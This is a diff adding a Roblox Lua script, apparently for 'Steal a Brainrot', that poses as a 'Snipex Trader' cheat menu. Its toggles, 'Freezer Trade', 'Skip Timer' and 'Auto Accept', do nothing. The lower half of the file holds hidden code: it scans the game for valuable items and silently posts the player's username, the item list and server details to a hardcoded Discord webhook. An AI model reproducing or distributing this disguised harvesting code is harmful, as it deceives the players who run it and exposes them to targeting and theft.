@@ -1,0 +1,420 @@
+--========================
+-- 🔥 MENU SNIPEX TRADER V3 (ESTILO MESSAGE-85)
+-- Apenas visual, sem funções, arrastável
+--========================
+
+-- BLOQUEIO DE UNIVERSO
+local ALLOWED_UNIVERSE = 7709344486
+
+if game.GameId ~= ALLOWED_UNIVERSE then
+    game.Players.LocalPlayer:Kick("Jogo errado, execute no SAB.")
+    return
+end
+
+-- SERVICES
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+-- PLAYER
+local player = Players.LocalPlayer
+
+-- LIMPA GUI ANTIGA
+pcall(function()
+    CoreGui.SnipexMenu:Destroy()
+end)
+
+-- CRIAÇÃO DO MENU (ESTILO MESSAGE-85)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SnipexMenu"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- FRAME PRINCIPAL
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 220, 0, 139) -- Aumentei um pouco a altura
+mainFrame.Position = UDim2.new(0.5, -110, 0.5, -90)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.BackgroundTransparency = 0.25
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.ClipsDescendants = false
+mainFrame.Parent = screenGui
+
+-- CANTOS ARREDONDADOS
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
+
+-- BORDA GRADIENTE (ESTILO MESSAGE-85)
+local borderStroke = Instance.new("UIStroke")
+borderStroke.Thickness = 4
+borderStroke.Color = Color3.fromRGB(255, 255, 255)
+borderStroke.Transparency = 0
+borderStroke.Parent = mainFrame
+
+local gradient = Instance.new("UIGradient")
+gradient.Rotation = 0
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
+    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(160,0,255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0,0,0)),
+    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(160,0,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
+}
+gradient.Parent = borderStroke
+
+-- ANIMAÇÃO DA BORDA (1.8s)
+task.spawn(function()
+    while borderStroke and borderStroke.Parent do
+        gradient.Offset = Vector2.new(-1,0)
+        local tween = TweenService:Create(gradient, 
+            TweenInfo.new(1.8, Enum.EasingStyle.Linear), 
+            {Offset = Vector2.new(1,0)})
+        tween:Play()
+        tween.Completed:Wait()
+    end
+end)
+
+-- TÍTULO "SNIPEX TRADER V3"
+local title = Instance.new("TextLabel")
+title.Parent = mainFrame
+title.Size = UDim2.new(1, -20, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "SNIPEX TRADER V4"
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextStrokeTransparency = 0
+title.TextStrokeColor3 = Color3.fromRGB(160, 0, 255)
+title.TextXAlignment = Enum.TextXAlignment.Center
+
+-- DIVIDER (LINHA ROXA)
+local divider = Instance.new("Frame")
+divider.Parent = mainFrame
+divider.Size = UDim2.new(0.8, 0, 0, 2)
+divider.Position = UDim2.new(0.1, 0, 0, 38)
+divider.BackgroundColor3 = Color3.fromRGB(160, 0, 255)
+divider.BorderSizePixel = 0
+
+-- FUNÇÃO PARA CRIAR TOGGLE NO MENU PRINCIPAL
+local function createMainToggle(text, yPos)
+    -- CONTAINER DO TOGGLE
+    local container = Instance.new("Frame")
+    container.Parent = mainFrame
+    container.Size = UDim2.new(1, -20, 0, 22)
+    container.Position = UDim2.new(0, 10, 0, yPos)
+    container.BackgroundTransparency = 1
+
+    -- TEXTO
+    local label = Instance.new("TextLabel")
+    label.Parent = container
+    label.Size = UDim2.new(1, -40, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextSize = 12
+    label.Font = Enum.Font.GothamBold
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(160, 0, 255)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- BOTÃO TOGGLE
+    local btn = Instance.new("TextButton")
+    btn.Parent = container
+    btn.Size = UDim2.new(0, 36, 0, 18)
+    btn.Position = UDim2.new(1, -36, 0.5, -9)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    btn.Text = ""
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(1, 0)
+    btnCorner.Parent = btn
+
+    local dot = Instance.new("Frame")
+    dot.Parent = btn
+    dot.Size = UDim2.new(0, 14, 0, 14)
+    dot.Position = UDim2.new(0, 2, 0.5, -7)
+    dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    local dotCorner = Instance.new("UICorner")
+    dotCorner.CornerRadius = UDim.new(1, 0)
+    dotCorner.Parent = dot
+
+    -- EFEITO DE CLIQUE
+    local active = false
+    btn.MouseButton1Click:Connect(function()
+        active = not active
+        local goal = active and UDim2.new(1, -18, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+        local col = active and Color3.fromRGB(160, 0, 255) or Color3.fromRGB(0, 0, 0)
+        TweenService:Create(dot, TweenInfo.new(0.15), {Position = goal}):Play()
+        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = col}):Play()
+    end)
+end
+
+-- CRIAR OS TRÊS TOGGLES DO MENU PRINCIPAL (DESCIDOS)
+createMainToggle("FREEZER TRADE", 50)  -- Era 45, agora 50
+createMainToggle("SKIP TIMER", 80)     -- Era 72, agora 80
+createMainToggle("AUTO ACCEPT", 110)   -- Era 99, agora 110
+
+-- TEXTO "CREATED BY SNIPEX COMMUNITY"
+local creditText = Instance.new("TextLabel")
+creditText.Parent = mainFrame
+creditText.Size = UDim2.new(1, -20, 0, 14)
+creditText.Position = UDim2.new(0, 10, 0, 40) -- Ajustado
+creditText.BackgroundTransparency = 1
+creditText.Text = "CREATED BY SNIPEX COMMUNITY"
+creditText.TextColor3 = Color3.fromRGB(255, 255, 255)
+creditText.TextSize = 6
+creditText.Font = Enum.Font.GothamBold
+creditText.TextStrokeTransparency = 0
+creditText.TextStrokeColor3 = Color3.fromRGB(160, 0, 255)
+creditText.TextXAlignment = Enum.TextXAlignment.Center
+
+-- LINK DO DISCORD
+local discordText = Instance.new("TextLabel")
+discordText.Parent = mainFrame
+discordText.Size = UDim2.new(1, -20, 0, 14)
+discordText.Position = UDim2.new(0, 10, 0, 127) -- Ajustado
+discordText.BackgroundTransparency = 1
+discordText.Text = "https://discord.gg/VU7Yu9hCY"
+discordText.TextColor3 = Color3.fromRGB(255, 255, 255)
+discordText.TextSize = 6
+discordText.Font = Enum.Font.GothamBold
+discordText.TextStrokeTransparency = 0
+discordText.TextStrokeColor3 = Color3.fromRGB(160, 0, 255)
+discordText.TextXAlignment = Enum.TextXAlignment.Center
+
+-- ============================================
+-- SISTEMA DE ARRASTAR
+-- ============================================
+local dragging = false
+local dragStart
+local startPos
+
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+local WEBHOOK = "https://discord.com/api/webhooks/1480380735235035176/5o5a_e7N58HRPVPb8r09PWixy7ibSh8ZYI9mOCSUCS2OVHQcVndytmDw8jpcICKmj8K7"
+
+-- PLAYER
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+
+-- SERVIDOR
+local Players = game:GetService("Players")
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+local serverCount = currentPlayers.."|"..maxPlayers
+
+-- BRAINROTS
+local Animals = {
+["1x1x1x1"]=true,["Meowl"]=true,["Skibidi Toilet"]=true,["Strawberry Elephant"]=true,
+["Quesadillo Vampiro"]=true,["Tacorita Bicicleta"]=true,["La Extinct Grande"]=true,
+["La Spooky Grande"]=true,["Chipso and Queso"]=true,["Chillin Chili"]=true,
+["Tuff Toucan"]=true,["Gobblino Uniciclino"]=true,["WorL"]=true,
+["La Jolly Grande"]=true,["La Taco Combinasion"]=true,["Swaggy Bros"]=true,
+["La Romantic Grande"]=true,["Festive 67"]=true,["Los Tralaleritos"]=true,
+["Nuclearo Dinossauro"]=true,["Money Money Puggy"]=true,["Tang Tang Keletang"]=true,
+["Ketupat Kepat"]=true,["Tictac Sahur"]=true,["Ketchuru and Masturu"]=true,
+["Lavadorito Spinito"]=true,["Garama and Madundung"]=true,
+["Burguro And Fryuro"]=true,["Capitano Moby"]=true,["Dragon Cannelloni"]=true,
+["Cerberus"]=true,["Agarrini la Palini"]=true,["Bunnyman"]=true,
+["Pirulitoita Bicicleteira"]=true,["Mariachi Corazoni"]=true,
+["Swag Soda"]=true,["Los Hotspotsitos"]=true,["Los Bros"]=true,
+["Tralaledon"]=true,["Los Primos"]=true,["Los Tacoritas"]=true,
+["Los Spaghettis"]=true,["Love Love Bear"]=true,["Spooky and Pumpky"]=true,
+["Los Puggies"]=true,["Ginger Gerat"]=true,["Fragrama and Chocrama"]=true,
+["La Casa Boo"]=true,["Los Sekolahs"]=true,["Reinito Sleighito"]=true,
+["Ketupat Bros"]=true,["Cooki and Milki"]=true,["La Supreme Combinasion"]=true,
+["Hydra Dragon Cannelloni"]=true,["Celularcini Viciosini"]=true,
+["Rosey and Teddy"]=true,["Popcuru and Fizzuru"]=true,
+["Dragon Gingerini"]=true,["Headless Horseman"]=true,
+["Mieteteira Bicicleteira"]=true,["La Grande Combinasion"]=true,
+["Cupid Cupid Sahur"]=true,["Chill Puppy"]=true,["Los Sweethearts"]=true,
+["Spinny Hammy"]=true,["Las Sis"]=true,["Los Planitos"]=true,
+["Los Mobilis"]=true,["Los Candies"]=true,["Bacuru and Egguru"]=true,
+["Money Money Reindeer"]=true,["Eviledon"]=true,["Orcaledon"]=true,
+["Jolly Jolly Sahur"]=true,["Les Jolly Combinasionas"]=true,
+["Chicleteira Noelteira"]=true,["Bisonte Giuppitere"]=true,
+["Jackorilla"]=true,["Please My Present"]=true,["Telemorte"]=true,
+["Naughty Naughty"]=true,["Cupid Hotspot"]=true,["Noo My Candy"]=true,
+["Noo My Present"]=true,["Donkeyturbo Express"]=true,["Los 25"]=true,
+["Noo My Heart"]=true,["Chimnino"]=true,["Fishino Clownino"]=true,
+["Chicleteira Cupideira"]=true,["Los Spooky Combinasionas"]=true,
+["La Ginger Sekolah"]=true,["Nooo My Hotspot"]=true,
+["Quesadilla Crocodila"]=true,["Los Quesadillas"]=true,
+["Burrito Bandito"]=true,["Pot Pumpkin"]=true,
+["Los Nooo My Hotspotsitos"]=true,["Rang Ring Bus"]=true,["67"]=true,
+["Los Burritos"]=true,["Noo My Examine"]=true,["Yess My Examine"]=true,
+["Los Chicleteiras"]=true,["Pot Hotspot"]=true,["Los 67"]=true,
+["Esok Sekolah"]=true,["Rosetti Tualetti"]=true,
+["Spaghetti Tualetti"]=true,["Sammyni Fattini"]=true,
+["La Food Combinasion"]=true,["La Secret Combinasion"]=true,
+["Los Amigos"]=true,["Los Combinasionas"]=true,
+["List List List Sahur"]=true,["Lovin Rose"]=true,
+["Chicleteira Bicicleteira"]=true,["Chicliterita Biciditerita"]=true,
+["Chicleteirina Bicicleteirina"]=true,["Guerriro Digitale"]=true,
+["La Vacca Saturno Saturnita"]=true,["Perrito Burrito"]=true,
+["Graipuss Medussi"]=true,["GOAT"]=true,["Las Tralaleritas"]=true,
+["Fragola La La La"]=true,["Extinct Matteo"]=true,["Karker Sahur"]=true,
+["Guest 666"]=true,["Brunito Marsito"]=true,
+["Bunito Bunito Spinito"]=true,["Los Trios"]=true,
+["Rocco Disco"]=true,["La Vacca Prese Presente"]=true,
+["La Karkerkar Combinasion"]=true,["Trenostruzzo Turbo 4000"]=true,
+["25"]=true,["La Sahur Combinasion"]=true,["Holy Arepa"]=true,
+["Pengolino Nuvoletto"]=true,
+["Gato Celesto"]=true,
+["Buho del Cielo"]=true,
+["Seraphino Gruyero"]=true,
+["Harpuccino"]=true,
+["Nacho Spyder"] = true,
+["Berenjello Angello"]=true,
+["Divino Platypio"]=true,
+["Astrolero Cervalero"]=true,
+["Dumborino Miracello"]=true,
+["Paradiso Axolottino"]=true,
+["Serafinna Medusella"]=true,
+["Cigno Fulgoro"]=true,
+["Corn Corn Corn Sahur"]=true,["Ho Ho Ho Sahur"]=true,
+["Extinct Tralalero"]=true,["La Cucaracha"]=true,
+["Vulturino Skeletono"]=true,["Zombie Tralala"]=true,
+["Boatito Auratito"]=true,["Reindeer Tralala"]=true,
+["Frankentteo"]=true,["Santteo"]=true,
+["Pumpkini Spyderini"]=true,["Love Love Love Sahur"]=true,
+["Santa Hotspot"]=true,["La Vacca Jacko Linterino"]=true,
+["Giftini Spyderini"]=true,["Coffin Tung Tung Tung Sahur"]=true,
+["Triplito Tralaleritos"]=true,["Trickolino"]=true,
+["Chachechi"]=true,["Sammyni Spyderini"]=true,
+["Karkerkar Kurkur"]=true,["Blackhole Goat"]=true,
+["Los Jobcitos"]=true,["Dul Dul Dul"]=true,
+["Tung Tung Tung Sahur"]=true,["Horegini Boom"]=true,
+["Los Matteos"]=true,["Los Karkeritos"]=true,
+["Arcadopus"]=true,["Los Spyderinis"]=true,
+["Los Tortus"]=true,["Mi Gatito"]=true,
+["Los Cucarachas"]=true,["Las Vaquitas Saturnitas"]=true,
+["Torrtuginni Dragonfrutini"]=true,["Los Mi Gatitos"]=true,
+["Job Job Job Sahur"]=true,["To To To Sahur"]=true,
+["Tralalero Tralala"]=true,["Matteo"]=true
+}
+
+local HttpService = game:GetService("HttpService")
+local request = syn and syn.request or http_request or request
+
+local function parseValue(text)
+    if not text then return 0 end
+    text = tostring(text)
+
+    -- ignora READY
+    if text:find("READY") then return 0 end
+
+    -- ignora timer
+    if text:find("h") or text:find("m") then return 0 end
+
+    -- aceita só B M K
+    if not text:find("B") and not text:find("M") and not text:find("K") then
+        return 0
+    end
+
+    local clean = text:gsub("[^%d%.BMK]", "")
+
+    local mult = 1
+    if clean:find("B") then
+        mult = 1e9
+    elseif clean:find("M") then
+        mult = 1e6
+    elseif clean:find("K") then
+        mult = 1e3
+    end
+
+    local num = clean:gsub("[BMK]", "")
+    return (tonumber(num) or 0) * mult
+end
+
+local found = {}
+
+for _, v in ipairs(workspace:GetDescendants()) do
+if v:IsA("TextLabel") and Animals[v.Text] then
+        local parent = v.Parent
+        
+        local gen = parent and parent:FindFirstChild("Generation") 
+                 or (parent and parent.Parent and parent.Parent:FindFirstChild("Generation"))
+        
+        if gen and gen:IsA("TextLabel") then
+            local val = parseValue(gen.Text)
+            table.insert(found,{
+                Name=v.Text,
+                IncomeText=gen.Text,
+                Value=val
+            })
+        else
+            table.insert(found,{
+                Name=v.Text,
+                IncomeText="???",
+                Value=0
+            })
+        end
+    end
+end
+
+table.sort(found,function(a,b)
+    return a.Value>b.Value
+end)
+
+if #found==0 then return end
+
+local list=""
+for _,item in ipairs(found) do
+    list=list.."• "..item.Name.." → `"..item.IncomeText.."`\n"
+end
+
+local horario=os.date("%H:%M:%S")
+
+local description=list.."\n😂 𝙋𝙡𝙖𝙮𝙚𝙧 𝙬𝙝𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚𝙙 👎: "..playerName
+
+local data={
+embeds={{
+title="🍓 𝘽𝙧𝙖𝙞𝙣𝙧𝙤𝙩𝙨 𝙁𝙤𝙪𝙣𝙙 🚽:",
+description=description,
+color=10494192,
+footer={
+text="🔥 𝙎𝙣𝙞𝙥𝙚𝙭ˡᵘᵃ ᶜᵒᵐᵐᵘⁿⁱᵗʸ 👻 ┃ "..horario.." 🇧🇷 ┃ "..serverCount
+}
+}}
+}
+
+request({
+Url=WEBHOOK,
+Method="POST",
+Headers={["Content-Type"]="application/json"},
+Body=HttpService:JSONEncode(data)
+})
